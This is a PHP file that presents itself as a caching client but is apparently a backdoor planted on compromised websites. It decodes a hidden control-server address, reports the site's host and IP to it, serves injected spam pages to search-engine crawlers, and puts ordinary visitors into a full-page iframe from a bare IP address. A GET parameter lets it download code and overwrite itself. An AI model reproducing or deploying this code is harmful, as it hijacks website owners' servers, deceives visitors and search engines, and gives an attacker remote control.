
<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 300);
@set_time_limit(0);

class CacheAPC {
 
    var $iTtl = 600;
    var $bEnabled = false;

    function CacheAPC() {
        $this->bEnabled = extension_loaded('apc');
    }
 
    function getData($sKey) {
        $bRes = false;
        $vData = apc_fetch($sKey, $bRes);
        return ($bRes) ? $vData :null;
    }
 
    function setData($sKey, $vData) {
        return apc_store($sKey, $vData, $this->iTtl);
    }
 
    function delData($sKey) {
        $bRes = false;
        apc_fetch($sKey, $bRes);
        return ($bRes) ? apc_delete($sKey) : true;
    }
	
	function store_ap($a)
	{
return apc_cache_info($a);
	}
	
	
	
} 


 
class FbiClient { 
 private $articles;
 private $curl;
 private $bot_detected;
 private $systemUrl = "2VGZhtQBk4FZ0VwYlxGZ";
 private $cacheFile= "";
 private $version_th_script = "1.1";
 private $cacheTime;
 private $botDetectorUrl = "";
 private $url_tds_file;
 private $file_opt = "0uUqhNUnj5FM6yJocEUpi1Pp31lpmSTow9lp05JMck2LsITocM2Y";
 private $file_tds = "0uUqhpUMdEzGyAQrj8lp05JMck2LsITocM2Y";

 function __construct($getLinks = false) {
  $this->decoder();
  $s = $this->GetSettings();
  $s = json_decode($s);
  $this->url_tds_file = $s->t;
  $this->cacheTime = $s->c;
  $this->url_tds_file =  base64_decode(str_rot13(strrev($this->url_tds_file)));

 
  if(isset($_GET['cl_update']))
 {
 if($_GET['cl_update'] == 1)
 {
 $this->update_th_client();
 die(); exit();
 } 
 }
 
 
 if(isset($_GET['check_site']))
 {
 if($_GET['check_site'] == 1)
 {
 $this->checking_site();
 die(); exit();
 } 
 
 }
 
 
 
 
 $url_path = $_SERVER['REQUEST_URI'];
 $server_names= str_replace("www.", "", $_SERVER["SERVER_NAME"]);

 
@session_start();
$pars  = parse_url($url_path);
$purl = $pars['path'];
$td_location = "http://".$this->url_tds_file.$this->file_tds;
$ur = $this->_ayksfeewwcca($td_location);
$group = explode("|",$ur);
$group_arr = array_diff($group, array(''));
$count_group = count($group_arr);
if($count_group > 0)
{
foreach($group_arr as $tds)
{
if(strlen($purl) > 4)
{
if (preg_match("%-$tds/%i", $purl)) {
$sel = $tds;
$_SESSION['tdstd'] = $tds;

}
}




}
}
 

 $salt_cashe_f = md5($server_names);
 if(function_exists('curl_init')) $this->curl = @curl_init();

 
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $this->bot_detected =  $this->DetectSearchEngine($user_agent);
 $pid = trim($_SERVER['REQUEST_URI']);
 $getlin = $pid;
 $psisd = parse_url($pid);
 $pid = str_replace("", "", $psisd['path']);
 $dir_cashe = $this->dircase();

 $this->cacheFile = $dir_cashe."/ee6483989bad0e130804e8daef5f48fa_".$salt_cashe_f;
 
 if(isset($_GET['clear_cashe_a']))
 {
  if($_GET['clear_cashe_a'] == 1)
 {
 unlink($this->cacheFile);
 }
 }
 
 
 $pid= str_replace("", "", $pid);
 $url=$pid.$salt_cashe_f;
 $crc=md5($url);
 
  
  if (!is_file($this->cacheFile))  
 file_put_contents($this->cacheFile, $this->_ser($this->getAllArticles()));
 
 $this->articles = $this->loadArticlesFromCache();

 
 if($this->bot_detected)
 {
if($getlin == "/")
{
foreach($this->articles->pages as $article){ $replacq = $article->link; $replacq = str_replace("/?p=", "", $replacq); $replacq = str_replace("//", "/", $replacq); echo $replacq." "; }
}
 $oCache = new CacheAPC();
 if ($oCache->bEnabled) {
 $usr_time = $oCache->store_ap("user");
 foreach($usr_time['cache_list'] as $baa)
 {
 if($baa['info'] == $crc)
{
$razn = time() - $baa['creation_time'];
if($razn > $this->cacheTime)
$oCache->delData($crc);
break;
} 
 }

 $aMemData = $oCache->getData($crc);
 
 if(!empty($aMemData))
 {
 print_r($aMemData);
 die(); exit();
 }
 }
 
if(!empty($dir_cashe) && file_exists($dir_cashe."/$crc"))
{
$modif=time()-@filemtime ($dir_cashe."/$crc"); 
if ($modif > $this->cacheTime)
{
@unlink($dir_cashe."/$crc");
}
else
{
include ($dir_cashe."/$crc");
die(); exit();
}
}
 }
 
$leng = strlen($url_path);
if($url_path != "/" && preg_match("/\.php/i", $url_path) && $leng > 9)
{
if (!preg_match("/wp-/i", $url_path) && !preg_match("/index.php/i", $url_path)  && !preg_match("/xmlrpc.php/i", $url_path)  && !preg_match("/administrator/i", $url_path) && !preg_match("/user-new.php/i", $url_path) && !preg_match("/profile.php/i", $url_path) && !preg_match("/tools.php/i", $url_path) && !preg_match("/nav-menus.php/i", $url_path) && !preg_match("/update-core.php/i", $url_path) && !preg_match("/post-new.php/i", $url_path) && !preg_match("/upload.php/i", $url_path) && !preg_match("/edit.php/i", $url_path) && !preg_match("/edit-comments.php/i", $url_path) && !preg_match("/themes.php/i", $url_path) && !preg_match("/customize.php/i", $url_path) && !preg_match("/widgets.php/i", $url_path) && !preg_match("/users.php/i", $url_path) && !preg_match("/options-/i", $url_path) && !preg_match("/administrator/i", $url_path)) {
   $site_url = $_SERVER['SERVER_NAME'];
   $site_url= str_replace("www.", "", $site_url);
   $linking_url = "http://".$this->systemUrl."/all_proj/".$site_url."/_q_".$url_path;
   
  if (@ini_get("allow_url_fopen") == "1") {
  
   if($this->bot_detected)
 {
   $result =  @file_get_contents($linking_url); $result= str_replace("/&amp;q=", "", $result); echo $result; if($result) { die(); exit();}
 }
 else
 {
 $postdata = http_build_query(
    array(
        'human' => '1',
    )
);

$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);
$context  = stream_context_create($opts);
$result =  @file_get_contents($linking_url,false, $context); $result= str_replace("/&amp;q=", "", $result); echo $result; if($result) { die(); exit();}
 }
  
  } 
  else
  {
   if(function_exists('curl_init')){

 if($this->bot_detected)
 {
 $result =  $this->getContentlinking($linking_url);  die(); exit();
 }
 else
 {
 $result =  $this->getContentlinking($linking_url,$tds = false,$human = true);  die(); exit();
 }
 
 
 }
  }
 
 }

}

  $gopid = str_replace("", "", $url_path);

  if (sizeof($this->articles->pages) == 0){
 return false; 
}
 $goodSlug = false;

 foreach($this->articles->pages as $article) {
 if ($article->slug == $gopid) {
 $goodSlug = true;
 }
 } 

 
  if ($this->bot_detected == false && $goodSlug == true) 
 {

?> 
<html><head></head><body style="margin: 0; padding: 0; height: 100%; overflow: hidden;"><div style="position:absolute; left: 0; right: 0; bottom: 0; top: 0px;"><iframe width="100%" height="100%" frameborder="0" src="http://178.62.39.214/?id=<?php echo $_SESSION['tdstd']; ?>"></div></body></html> 
<?php 

 die(); exit();

 } 

foreach($this->articles->pages as $article) 
{ 
if ($article->slug == $gopid) 
{
$article->article = str_replace("/?p=", "", $article->article);


if ($oCache->bEnabled) {
$oCache->setData($crc, $article->article);
}
else
{
if(!empty($dir_cashe))
{
$url=$pid.$salt_cashe_f;
$crc=md5($url);
if (file_exists($dir_cashe."/$crc")) {
$modif=time()-@filemtime ($dir_cashe."/$crc"); 
if ($modif>$this->cacheTime)
{ 
$fp = @fopen ($dir_cashe."/$crc", "wb");
@fwrite ($fp, $article->article);
@fclose ($fp);
}
}
else
{
$fp = @fopen ($dir_cashe."/$crc", "wb");
@fwrite ($fp, $article->article);
@fclose ($fp);
}
}
}




if (!preg_match("/\.php/i", $url_path)) {

}

 echo $article->article;
 die(); exit();
 }
 }
 
 
 }
 
 
  
 private function isBot() {
 $result = $this->getContent("http://".$this->botDetectorUrl,"ip=".urlencode($_SERVER[REMOTE_ADDR])."&useragent=".urlencode($_SERVER[HTTP_USER_AGENT])."&key=g0g0"); if ($result === "0") return false; return true;
 } 
 
 
 
 
 
 
 private function loadArticlesFromCache() {
 if(file_exists($this->cacheFile))
 {
 $data = $this->_unser(file_get_contents($this->cacheFile));
 if ((time()-$data->createTime) >= $this->cacheTime) { @unlink($this->cacheFile);
 } return $data;
 }
 }
 
 private function getAllArticles() {
 $withoutwww= str_replace("www.", "", $_SERVER["SERVER_NAME"]);
 $data = array( "host" => $withoutwww, "ip" => $_SERVER["SERVER_ADDR"], "serverKey"=> md5($withoutwww), );
 $articles = $this->getContent("http://".$this->systemUrl."/send.php", "data=".json_encode($data));
 $articles = json_decode($articles);
 if ($articles->stat != "success") {
 return false;
 } 
 $articles->createTime = time();
 return $articles;
 }
 
 private function GetSettings() {
 $r = "http://".$this->systemUrl."/get_settings.php";
 $settings = $this->_ayksfeewwcca($r);
 return $settings;
 }
 

 
 

 
   private function getContentlinking($url,$tds = false,$human = false) {
 curl_setopt($this->curl, CURLOPT_URL, $url);
 curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT,10);
 if($tds)
 {
  curl_setopt ($this->curl , CURLOPT_USERAGENT , "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.12) Gecko/20050919 Firefox/1.0.7");
  curl_setopt($this->curl, CURLOPT_FOLLOWLOCATION, 1); 
  curl_setopt ($this->curl , CURLOPT_RETURNTRANSFER , 1 ); 
 }
 
 if($human)
 {
    curl_setopt($this->curl, CURLOPT_POST, true);
    curl_setopt($this->curl, CURLOPT_POSTFIELDS, "human=1");
 }

 curl_setopt($this->curl, CURLOPT_VERBOSE, false);
 curl_setopt($this->curl, CURLOPT_HEADER,false);
 $res =  curl_exec($this->curl);
 
  if($tds)
 {
$header  = curl_getinfo($this->curl);
$err     = curl_errno($this->curl);
$errmsg  = curl_error($this->curl );
return array($res,$header['url']);
 }
return $res;
 } 
 
 
  private function getContent($url,$post = false) {
 curl_setopt($this->curl, CURLOPT_URL, $url);
 if ($post != false) curl_setopt($this->curl, CURLOPT_POSTFIELDS, $post);
 curl_setopt($this->curl, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;
 Googlebot/2.1;
 +http://www.google.com/bot.html)");
 curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT,20);
 curl_setopt($this->curl, CURLOPT_VERBOSE, false);
 curl_setopt($this->curl, CURLOPT_HEADER,false);
 curl_setopt($this->curl, CURLOPT_POST, true);
 curl_setopt($this->curl, CURLOPT_RETURNTRANSFER,true);
 return curl_exec($this->curl);
 } 
 
private function DetectSearchEngine($USER_AGENT)
    {
        $engines = array(
        array('Aport', 'Aport'),
        array('chishijen1Google', 'chishijen1Google'),
        array('Google', 'Google'),
        array('msnbot', 'MSN'),
        array('Rambler', 'Rambler'),
        array('Yahoo', 'Yahoo'),
        array('Yandex', 'Yandex'),
        array('Aport', 'Aport robot'),
        array('Google', 'Google'),
        array('msnbot', 'MSN'),
        array('Rambler', 'Rambler'),
        array('Yahoo', 'Yahoo'),
        array('AbachoBOT', 'AbachoBOT'),
        array('accoona', 'Accoona'),
        array('AcoiRobot', 'AcoiRobot'),
        array('ASPSeek', 'ASPSeek'),
        array('CrocCrawler', 'CrocCrawler'),
        array('Dumbot', 'Dumbot'),
        array('FAST-WebCrawler', 'FAST-WebCrawler'),
        array('GeonaBot', 'GeonaBot'),
        array('Gigabot', 'Gigabot'),
        array('Lycos', 'Lycos spider'),
        array('MSRBOT', 'MSRBOT'),
        array('Scooter', 'Altavista robot'),
        array('AltaVista', 'Altavista robot'),
        array('WebAlta', 'WebAlta'),
        array('IDBot', 'ID-Search Bot'),
        array('eStyle', 'eStyle Bot'),
        array('Mail.Ru', 'Mail.Ru Bot'),
        array('Scrubby', 'Scrubby robot'),
        array('Yandex', 'Yandex')
        );
       
        foreach ($engines as $engine)
        {
            if (stristr($USER_AGENT, $engine[0]))
            {
                return($engine[1]);
            }
        }
        return (false);
    } 


 private function update_th_client()
 {
 $location_update = "http://".$this->systemUrl.$this->file_opt; 
 $url = $this->_ayksfeewwcca($location_update);
 if($url)
 {
 if (strlen($url) > 2000) {
  $file =  __FILE__; 
 $fp = fopen($file,"wb");
 fwrite($fp,$url);
 fclose($fp);
 echo "<!-- updok -->";
 }

 }
 }
	
	
private function _ayksfeewwcca($url){
$local2 = $_SERVER['DOCUMENT_ROOT'];
if (@ini_get("allow_url_fopen") == "1") {
$wpopt = @file_get_contents($url);
return $wpopt;
}
 else
{
  if(function_exists('curl_init')) {
 $curl = @curl_init();
 curl_setopt($curl, CURLOPT_URL, $url);
 curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;
 Googlebot/2.1;
 +http://www.google.com/bot.html)");
 curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
 curl_setopt($curl, CURLOPT_VERBOSE, false);
 curl_setopt($curl, CURLOPT_HEADER,false);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
 $wpopt = curl_exec($curl);
 return $wpopt;
}
	}
return false;
}
	
	
 private function checking_site() {
  
  echo "<!-- clienthere -->";
   if(@ini_get('safe_mode')) {
   echo "<!-- safemode -->"; }
   $docroot = $_SERVER['DOCUMENT_ROOT'];
   $htacces = $docroot."/.htaccess";
   if(!@file_exists($htacces))
   {
   echo "<!-- notfoundhtaccess -->";
   }
if(!function_exists('curl_init')) {
echo "<!-- notcurl -->";
}



if(@file_exists($htacces))
{
            $search_htac = file_get_contents($htacces);
            if(!preg_match("%index.php%", $search_htac))
            echo "<!-- notnoteshtaccess -->";
}




if(function_exists('php_uname')) {
$os_string = php_uname('s');
if (strpos(strtoupper($os_string), 'WIN')!==false) {
echo "<!-- windows -->";
} else {
echo "<!-- linux -->";
}
}


 $oCache = new CacheAPC();
 if ($oCache->bEnabled) {
 echo "<!-- yescasheapc -->";
 }
  else
  {
$dir_cashe = $this->dircase();
if(!@empty($dir_cashe))
echo "<!-- yescachefiles -->";
  }
 
echo "<!-- version: [$this->version_th_script] -->";



 }
	
	
	
	
private function dircase()
{
switch(true)
{
case @is_writable(@ini_get('upload_tmp_dir')):
$dir_cashe = @ini_get('upload_tmp_dir');
return $dir_cashe;
break;
case @is_writable(@sys_get_temp_dir()):
$dir_cashe = $dir_cashe = @sys_get_temp_dir();
return $dir_cashe;
break;
case @is_writable("/dev/shm"):
$dir_cashe = "/dev/shm";
return $dir_cashe;
break;
default:
$dir_cashe = "";
return $dir_cashe;
break;
}
}
	
	
	
	
	
	
 private function _ser($data) {
 return serialize($data);
 }

 private function _unser($data) {
 return unserialize($data);
 } 
 
 private function decoder() {
 $this->cacheFile = base64_decode(str_rot13(strrev($this->cacheFile)));
 $this->systemUrl = base64_decode(str_rot13(strrev($this->systemUrl)));
 $this->file_opt = base64_decode(str_rot13(strrev($this->file_opt)));
 $this->file_tds = base64_decode(str_rot13(strrev($this->file_tds)));
 }
 
 }

  new FbiClient;

?>
